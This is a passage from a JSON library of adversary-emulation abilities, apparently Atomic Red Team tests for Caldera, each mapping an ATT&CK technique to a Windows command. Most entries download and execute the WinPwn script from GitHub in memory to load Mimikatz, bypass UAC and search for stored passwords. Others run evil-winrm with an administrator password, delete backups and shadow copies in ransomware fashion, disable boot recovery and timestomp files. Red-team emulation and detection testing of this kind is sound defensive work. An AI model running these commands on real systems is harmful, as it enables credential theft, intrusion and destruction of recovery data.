"566b2f5743d88edb44ad1d9d450e921c", "technique_id": "T1082", "tactic": "discovery", "requirements": [], "name": "WinPwn - RBCD-Check", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Reflectively load Mimik@tz into memory technique via function of WinPwn", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); mimiload -consoleoutput -noninteractive", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Reflective Code Loading", "ability_id": "aa758d17faffeeb69c56481340891859", "technique_id": "T1620", "tactic": "defense-evasion", "requirements": [], "name": "WinPwn - Reflectively load Mimik@tz into memory", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Launches SessionGopher on this system via WinPwn", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); sessionGopher -noninteractive -consoleoutput", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Unsecured Credentials: Credentials In Files", "ability_id": "6d968b2bfa7f45550662620724618fb9", "technique_id": "T1552.001", "tactic": "credential-access", "requirements": [], "name": "WinPwn - SessionGopher", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Check Domain Network-Shares for cleartext passwords using Snaffler function of WinPwn", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); Snaffler -noninteractive -consoleoutput", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Unsecured Credentials: Credentials In Files", "ability_id": "58351281e64f2182ac4f8b44f63e9042", "technique_id": "T1552.001", "tactic": "credential-access", "requirements": [], "name": "WinPwn - Snaffler", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "UAC Bypass DccwBypassUAC technique via function of WinPwn", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/dccuac.ps1')", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Abuse Elevation Control Mechanism: Bypass User Account Control", "ability_id": "b473176c321f31824c909c73807caf92", "technique_id": "T1548.002", "tactic": "multiple", "requirements": [], "name": "WinPwn - UAC Bypass DccwBypassUAC technique", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "UAC bypass using DiskCleanup technique via function of WinPwn", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); UACBypass -noninteractive -command \"C:\\windows\\system32\\cmd.exe\" -technique DiskCleanup", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Abuse Elevation Control Mechanism: Bypass User Account Control", "ability_id": "f27b37f253617c39ac010d2ee1238b7e", "technique_id": "T1548.002", "tactic": "multiple", "requirements": [], "name": "WinPwn - UAC Bypass DiskCleanup technique", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "UAC bypass using ccmstp technique via function of WinPwn", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); UACBypass -noninteractive -command \"C:\\windows\\system32\\calc.exe\" -technique ccmstp", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Abuse Elevation Control Mechanism: Bypass User Account Control", "ability_id": "1bb96a80fd7968839ead470953ffb738", "technique_id": "T1548.002", "tactic": "multiple", "requirements": [], "name": "WinPwn - UAC Bypass ccmstp technique", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "UAC bypass using Magic technique via function of WinPwn", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); UACBypass -noninteractive -command \"C:\\windows\\system32\\cmd.exe\" -technique magic", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Abuse Elevation Control Mechanism: Bypass User Account Control", "ability_id": "824ec334619ca634d13aff308a9a064c", "technique_id": "T1548.002", "tactic": "multiple", "requirements": [], "name": "WinPwn - UAC Magic", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Search for bluekeep vulnerable Windows Systems in the domain using bluekeep function of WinPwn. Can take many minutes to complete (~600 seconds in testing on a small domain).", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); bluekeep -noninteractive -consoleoutput", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Network Service Discovery", "ability_id": "9381d0e0efbf5bf89a9e512f8b3745f4", "technique_id": "T1046", "tactic": "discovery", "requirements": [], "name": "WinPwn - bluekeep", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Search for potentially vulnerable web apps (low hanging fruits) using fruit function of WinPwn", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); fruit -noninteractive -consoleoutput", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Network Service Discovery", "ability_id": "01f95fd0213aeb1eb07fca8dc548f5ce", "technique_id": "T1046", "tactic": "discovery", "requirements": [], "name": "WinPwn - fruit", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Gathers general domain information using the generaldomaininfo function of WinPwn", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); generaldomaininfo -noninteractive -consoleoutput", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Account Discovery: Domain Account", "ability_id": "4bf4facd1dad540d4b17ebe0db235707", "technique_id": "T1087.002", "tactic": "discovery", "requirements": [], "name": "WinPwn - generaldomaininfo", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Discover Local Privilege Escalation possibilities using itm4nprivesc function of WinPwn", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); itm4nprivesc -noninteractive -consoleoutput", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "System Information Discovery", "ability_id": "628181210e822588b5d90e1e256d775a", "technique_id": "T1082", "tactic": "discovery", "requirements": [], "name": "WinPwn - itm4nprivesc", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Search for Passwords on this system using passhunt via WinPwn", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["rm -force .\\passhunt.exe -ErrorAction Ignore; rm -force .\\phunter* -ErrorAction Ignore; rm -force -recurse .\\DomainRecon -ErrorAction Ignore; rm -force -recurse .\\Exploitation -ErrorAction Ignore; rm -force -recurse .\\LocalPrivEsc -ErrorAction Ignore; rm -force -recurse .\\LocalRecon -ErrorAction Ignore; rm -force -recurse .\\Vulnerabilities -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); passhunt -local $true -noninteractive", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Unsecured Credentials: Credentials In Files", "ability_id": "9c2f9c808a72b05686236a63e1da93c8", "technique_id": "T1552.001", "tactic": "credential-access", "requirements": [], "name": "WinPwn - passhunt", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Start PowerUpSQL Checks using powerSQL function of WinPwn", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); powerSQL -noninteractive -consoleoutput", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Software Discovery", "ability_id": "57548b3eefc3c3d3eaf8c3b51380921a", "technique_id": "T1518", "tactic": "discovery", "requirements": [], "name": "WinPwn - powerSQL", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Check Powershell event logs for credentials or other sensitive information via winpwn powershellsensitive function.", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); powershellsensitive -consoleoutput -noninteractive", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Unsecured Credentials: Credentials In Files", "ability_id": "f2d48f9efed23e058bfe0f46d93d07a2", "technique_id": "T1552.001", "tactic": "credential-access", "requirements": [], "name": "WinPwn - powershellsensitive", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Search for printers / potential vulns using printercheck function of WinPwn", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); printercheck -noninteractive -consoleoutput", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Peripheral Device Discovery", "ability_id": "941eb886a05444e588fd6c17d992df98", "technique_id": "T1120", "tactic": "discovery", "requirements": [], "name": "WinPwn - printercheck", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Search for sensitive files on this local system using the SensitiveFiles function of WinPwn", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); sensitivefiles -noninteractive -consoleoutput", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Unsecured Credentials: Credentials In Files", "ability_id": "2d2b2b31b70f1beef285b942c580f4c3", "technique_id": "T1552.001", "tactic": "credential-access", "requirements": [], "name": "WinPwn - sensitivefiles", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Network share enumeration using the shareenumeration function of WinPwn", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); shareenumeration -noninteractive -consoleoutput", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Network Share Discovery", "ability_id": "d7f1270ba66d5947a1422f7d5b1a36ef", "technique_id": "T1135", "tactic": "discovery", "requirements": [], "name": "WinPwn - shareenumeration", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Start MS-RPRN RPC Service Scan using spoolvulnscan function of WinPwn", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); spoolvulnscan -noninteractive -consoleoutput", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Network Service Discovery", "ability_id": "bc34d6834bdf568e206627f7809a556f", "technique_id": "T1046", "tactic": "discovery", "requirements": [], "name": "WinPwn - spoolvulnscan", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Discover Local Privilege Escalation possibilities using winPEAS function of WinPwn", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); winPEAS -noninteractive -consoleoutput", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "System Information Discovery", "ability_id": "e6a9fe7e91030f05ad87b75ad4fd4a3a", "technique_id": "T1082", "tactic": "discovery", "requirements": [], "name": "WinPwn - winPEAS", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "An adversary may attempt to use Evil-WinRM with a valid account to interact with remote systems that have WinRM enabled", "repeatable": false, "privilege": "", "buckets": ["lateral-movement"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "evil-winrm -i Target -u Domain\\Administrator -p P@ssw0rd1", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Remote Services: Windows Remote Management", "ability_id": "55e5a14e5601b7ea81e8bb272b7e03be", "technique_id": "T1021.006", "tactic": "lateral-movement", "requirements": [], "name": "WinRM Access with Evil-WinRM", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test uses BITSAdmin.exe to schedule a BITS job for the download of a file.\nThis technique is used by Qbot malware to download payloads.\n", "repeatable": false, "privilege": "", "buckets": ["command-and-control"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "C:\\Windows\\System32\\bitsadmin.exe /transfer qcxjb7 /Priority HIGH https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt %temp%\\Atomic-license.txt", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Ingress Tool Transfer", "ability_id": "68f09bfb5a5a28c11608d106eac63abd", "technique_id": "T1105", "tactic": "command-and-control", "requirements": [], "name": "Windows - BITSAdmin BITS Download", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Deletes backup files in a manner similar to Ryuk ransomware. Upon exection, many \"access is denied\" messages will appear as the commands try\nto delete files from around the system.\n", "repeatable": false, "privilege": "", "buckets": ["impact"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "del /s /f /q c:\\*.VHD c:\\*.bac c:\\*.bak c:\\*.wbcat c:\\*.bkf c:\\Backup*.* c:\\backup*.* c:\\*.set c:\\*.win c:\\*.dsk", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Inhibit System Recovery", "ability_id": "5a9a7d8b4f632652c3ed175c071c5c7a", "technique_id": "T1490", "tactic": "impact", "requirements": [], "name": "Windows - Delete Backup Files", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Deletes Windows Volume Shadow Copies. This technique is used by numerous ransomware families and APT malware such as Olympic Destroyer. Upon\nexecution, if no shadow volumes exist the message \"No items found that satisfy the query.\" will be displayed. If shadow volumes are present, it\nwill delete them without printing output to the screen. This is because the /quiet parameter was passed which also suppresses the y/n\nconfirmation prompt. Shadow copies can only be created on Windows server or Windows 8.\n\nhttps://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc788055(v=ws.11)\n", "repeatable": false, "privilege": "", "buckets": ["impact"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "vssadmin.exe delete shadows /all /quiet", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Inhibit System Recovery", "ability_id": "153905affadb36241ced3d3b12ba0481", "technique_id": "T1490", "tactic": "impact", "requirements": [], "name": "Windows - Delete Volume Shadow Copies", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Deletes Windows Volume Shadow Copies via WMI. This technique is used by numerous ransomware families and APT malware such as Olympic Destroyer.\nShadow copies can only be created on Windows server or Windows 8.\n", "repeatable": false, "privilege": "", "buckets": ["impact"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "wmic.exe shadowcopy delete", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Inhibit System Recovery", "ability_id": "c156ac5c9fa67080365268d95f29053d", "technique_id": "T1490", "tactic": "impact", "requirements": [], "name": "Windows - Delete Volume Shadow Copies via WMI", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Deletes Windows Volume Shadow Copies with PowerShell code and Get-WMIObject.\nThis technique is used by numerous ransomware families such as Sodinokibi/REvil.\nExecutes Get-WMIObject. Shadow copies can only be created on Windows server or Windows 8, so upon execution\nthere may be no output displayed.\n", "repeatable": false, "privilege": "", "buckets": ["impact"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();}", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Inhibit System Recovery", "ability_id": "e90756bb6dcd21462dc4cc452661df91", "technique_id": "T1490", "tactic": "impact", "requirements": [], "name": "Windows - Delete Volume Shadow Copies via WMI with PowerShell", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Disables repair by the Windows Recovery Console on boot. This technique is used by numerous ransomware families and APT malware such as Olympic Destroyer.\nUpon execution, \"The operation completed successfully.\" will be displayed in the powershell session.\n", "repeatable": false, "privilege": "", "buckets": ["impact"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["bcdedit.exe /set {default} bootstatuspolicy DisplayAllFailures >nul 2>&1 && bcdedit.exe /set {default} recoveryenabled yes >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures && bcdedit.exe /set {default} recoveryenabled no", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Inhibit System Recovery", "ability_id": "8467c994685ccf178db166964bd80fab", "technique_id": "T1490", "tactic": "impact", "requirements": [], "name": "Windows - Disable Windows Recovery Console Repair", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Use schtasks.exe to disable the System Restore (SR) scheduled task\n", "repeatable": false, "privilege": "", "buckets": ["impact"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["schtasks.exe /Change /TN \"\\Microsoft\\Windows\\SystemRestore\\SR\" /enable >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "schtasks.exe /Change /TN \"\\Microsoft\\Windows\\SystemRestore\\SR\" /disable", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Inhibit System Recovery", "ability_id": "2d53d6fabd39bf9c70b0dfcdfbbc926d", "technique_id": "T1490", "tactic": "impact", "requirements": [], "name": "Windows - Disable the SR scheduled task", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Uses the dsquery command to discover domain trusts.\nRequires the installation of dsquery via Windows RSAT or the Windows Server AD DS role.\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "dsquery * -filter \"(objectClass=trustedDomain)\" -attr *", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Domain Trust Discovery", "ability_id": "f25fb8543b8e49af2aba023985234d1e", "technique_id": "T1482", "tactic": "discovery", "requirements": [], "name": "Windows - Discover domain trusts with dsquery", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Uses the nltest command to discover domain trusts.\nRequires the installation of nltest via Windows RSAT or the Windows Server AD DS role.\nThis technique has been used by the Trickbot malware family.\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "nltest /domain_trusts && nltest /trusted_domains", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Domain Trust Discovery", "ability_id": "41498c1be5b92133cb9df50bd84211a4", "technique_id": "T1482", "tactic": "discovery", "requirements": [], "name": "Windows - Discover domain trusts with nltest", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Modifies the file creation timestamp of a specified file. This technique was seen in use by the Stitch RAT.\nTo verify execution, use File Explorer to view the Properties of the file and observe that the Created time is the year 1970.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Get-ChildItem $env:TEMP\\T1551.006_timestomp.txt | % { $_.CreationTime = \"01/01/1970 00:00:00\" }", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Indicator Removal on Host: Timestomp", "ability_id": "5e4bd19a25040d3b9f7ecb61bec62f22", "technique_id": "T1070.006", "tactic": "defense-evasion", "requirements": [], "name": "Windows - Modify file creation 